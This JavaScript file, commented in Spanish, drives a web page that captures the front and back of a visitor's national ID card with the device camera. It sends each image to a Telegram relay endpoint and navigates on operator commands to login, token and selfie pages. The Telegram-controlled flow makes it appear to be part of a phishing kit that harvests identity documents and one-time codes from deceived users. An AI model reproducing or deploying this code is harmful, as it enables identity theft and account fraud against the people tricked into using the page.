/**
 * CÉDULA - CAPTURA DE DOCUMENTO
 * Captura frontal y trasera de la cédula con validación
 * Versión optimizada con arquitectura robusta
 */

(() => {
    'use strict';

    // ============================
    // ESTADO DE LA APLICACIÓN
    // ============================
    const appState = {
        video: null,
        canvas: null,
        stream: null,
        currentSide: 'frontal', // 'frontal' o 'trasera'
        capturedPhotos: {
            frontal: null,
            trasera: null
        },
        messageId: null,
        isCapturing: false,
        isCameraActive: false
    };

    // ============================
    // ELEMENTOS DEL DOM
    // ============================
    const elements = {
        video: null,
        canvas: null,
        captureBtn: null,
        continueBtn: null,
        instructionText: null,
        progressStep: null
    };

    // ============================
    // CONSTANTES
    // ============================
    const CAMERA_CONSTRAINTS = {
        video: {
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 }
        }
    };

    const IMAGE_QUALITY = 0.95;

    // ============================
    // INICIALIZACIÓN
    // ============================
    function init() {
        console.log('🎬 Inicializando captura de cédula...');

        if (!initializeElements()) {
            console.error('❌ Error: Elementos DOM no encontrados');
            return;
        }

        if (!validateCommonUtils()) {
            console.error('❌ Error: commonUtils no disponible');
            return;
        }

        // Inicializar utilidades comunes
        window.commonUtils.initializeCommon();

        // Obtener messageId de datos previos
        loadPreviousData();

        // Configurar event listeners
        setupEventListeners();

        // Iniciar cámara automáticamente
        startCamera();

        console.log('✅ Inicialización completada');
    }

    // ============================
    // INICIALIZACIÓN DE ELEMENTOS
    // ============================
    function initializeElements() {
        elements.video = document.getElementById('video');
        elements.canvas = document.getElementById('canvas');
        elements.captureBtn = document.getElementById('captureBtn');
        elements.continueBtn = document.getElementById('continueBtn');
        elements.instructionText = document.getElementById('instructionText');
        elements.progressStep = document.querySelector('.progress-step.active');

        appState.video = elements.video;
        appState.canvas = elements.canvas;

        return elements.video && elements.canvas && elements.captureBtn;
    }

    // ============================
    // VALIDACIONES
    // ============================
    function validateCommonUtils() {
        return window.commonUtils && 
               typeof window.commonUtils.initializeCommon === 'function' &&
               typeof window.commonUtils.showError === 'function' &&
               typeof window.commonUtils.getSessionId === 'function';
    }

    // ============================
    // CARGAR DATOS PREVIOS
    // ============================
    function loadPreviousData() {
        try {
            const storedData = sessionStorage.getItem('formData');
            if (storedData) {
                const data = JSON.parse(storedData);
                appState.messageId = data.messageId || `temp_${Date.now()}`;
                console.log('📦 Datos previos cargados, messageId:', appState.messageId);
            } else {
                appState.messageId = `cedula_${Date.now()}`;
                console.log('⚠️ No hay datos previos, messageId generado:', appState.messageId);
            }
        } catch (error) {
            console.error('❌ Error al cargar datos previos:', error);
            appState.messageId = `cedula_${Date.now()}`;
        }
    }

    // ============================
    // EVENT LISTENERS
    // ============================
    function setupEventListeners() {
        elements.captureBtn.addEventListener('click', handleCapture);
        
        if (elements.continueBtn) {
            elements.continueBtn.addEventListener('click', handleContinue);
        }

        // Limpiar al salir
        window.addEventListener('beforeunload', cleanup);

        // Listener para acciones de Telegram
        if (window.socket) {
            window.socket.on('telegram_action', handleTelegramAction);
        }
    }

    // ============================
    // CÁMARA
    // ============================
    async function startCamera() {
        if (appState.isCameraActive) {
            console.log('⚠️ La cámara ya está activa');
            return;
        }

        try {
            console.log('📹 Iniciando cámara...');
            appState.stream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
            
            elements.video.srcObject = appState.stream;
            elements.video.play();
            
            appState.isCameraActive = true;
            console.log('✅ Cámara iniciada correctamente');
        } catch (error) {
            console.error('❌ Error al acceder a la cámara:', error);
            window.commonUtils.showError(
                'No se pudo acceder a la cámara. Por favor, otorgue los permisos necesarios.'
            );
        }
    }

    function stopCamera() {
        if (appState.stream) {
            appState.stream.getTracks().forEach(track => track.stop());
            appState.stream = null;
            appState.isCameraActive = false;
            console.log('🛑 Cámara detenida');
        }
    }

    // ============================
    // CAPTURA DE FOTO
    // ============================
    async function handleCapture() {
        if (appState.isCapturing) {
            console.log('⚠️ Captura en progreso...');
            return;
        }

        appState.isCapturing = true;
        elements.captureBtn.disabled = true;

        try {
            console.log(`📸 Capturando lado ${appState.currentSide}...`);

            // Obtener foto en base64
            const photoData = capturePhoto();
            
            if (!photoData) {
                throw new Error('No se pudo capturar la foto');
            }

            // Guardar foto según el lado
            appState.capturedPhotos[appState.currentSide] = photoData;
            console.log(`✅ Foto ${appState.currentSide} capturada`);

            // Enviar a Telegram
            await sendPhotoToTelegram(photoData, appState.currentSide);

            // Actualizar UI según el lado capturado
            if (appState.currentSide === 'frontal') {
                // Cambiar a captura trasera
                appState.currentSide = 'trasera';
                updateUIForSide('trasera');
                elements.captureBtn.disabled = false;
                console.log('🔄 Listo para capturar lado trasero');
            } else {
                // Ambos lados capturados
                console.log('✅ Ambos lados capturados, mostrando botón continuar');
                elements.captureBtn.style.display = 'none';
                if (elements.continueBtn) {
                    elements.continueBtn.style.display = 'block';
                }
                stopCamera();
            }

        } catch (error) {
            console.error('❌ Error en captura:', error);
            window.commonUtils.showError('Error al capturar la foto. Intente nuevamente.');
            elements.captureBtn.disabled = false;
        } finally {
            appState.isCapturing = false;
        }
    }

    function capturePhoto() {
        const context = elements.canvas.getContext('2d');
        elements.canvas.width = elements.video.videoWidth;
        elements.canvas.height = elements.video.videoHeight;
        
        context.drawImage(elements.video, 0, 0);
        
        return elements.canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
    }

    // ============================
    // ENVÍO A TELEGRAM
    // ============================
    async function sendPhotoToTelegram(photoData, side) {
        const sessionId = window.commonUtils.getSessionId();
        const sideLabel = side === 'frontal' ? 'Cédula Frontal' : 'Cédula Trasera';

        const data = {
            tipo: sideLabel,
            messageId: appState.messageId,
            foto: photoData,
            sessionId: sessionId
        };

        console.log(`📤 Enviando foto ${side} a Telegram con sessionId:`, sessionId);

        window.loadingOverlay.showSending(`Enviando foto ${side}...`);

        try {
            const response = await fetch('/api/send-telegram', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(`Error del servidor: ${response.status}`);
            }

            const result = await response.json();

            if (!result.success) {
                throw new Error(result.error || 'Error al enviar foto');
            }

            console.log(`✅ Foto ${side} enviada exitosamente, Message ID:`, result.messageId);

            // Mantener overlay visible esperando respuesta de Telegram
            window.loadingOverlay.show('Esperando validación...');

        } catch (error) {
            console.error(`❌ Error al enviar foto ${side}:`, error);
            window.loadingOverlay.hide();
            throw error;
        }
    }

    // ============================
    // ACTUALIZACIÓN DE UI
    // ============================
    function updateUIForSide(side) {
        if (!elements.instructionText) return;

        if (side === 'trasera') {
            elements.instructionText.textContent = 'Ahora captura el lado trasero de tu cédula';
            elements.captureBtn.textContent = '📸 Capturar Reverso';
            console.log('🔄 UI actualizada para captura trasera');
        }
    }

    // ============================
    // CONTINUAR
    // ============================
    function handleContinue() {
        console.log('➡️ Continuando al siguiente paso (token)...');
        window.location.href = 'token.html';
    }

    // ============================
    // ACCIONES DE TELEGRAM
    // ============================
    function handleTelegramAction(action) {
        console.log('📱 Acción recibida de Telegram:', action);
        window.loadingOverlay.hide();

        const actionHandlers = {
            'pedir_logo': () => window.location.href = 'index.html',
            'pedir_token': () => window.location.href = 'token.html',
            'pedir_cara': () => window.location.href = 'cara.html',
            'pedir_cedula': () => window.location.reload(),
            'finalizar': () => {
                window.commonUtils.showSuccess('Proceso completado exitosamente');
                setTimeout(() => window.location.href = 'index.html', 2000);
            }
        };

        const handler = actionHandlers[action];
        if (handler) {
            handler();
        } else {
            console.warn('⚠️ Acción desconocida:', action);
        }
    }

    // ============================
    // LIMPIEZA
    // ============================
    function cleanup() {
        stopCamera();
        console.log('🧹 Recursos liberados');
    }

    // ============================
    // AUTO-INICIO
    // ============================
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
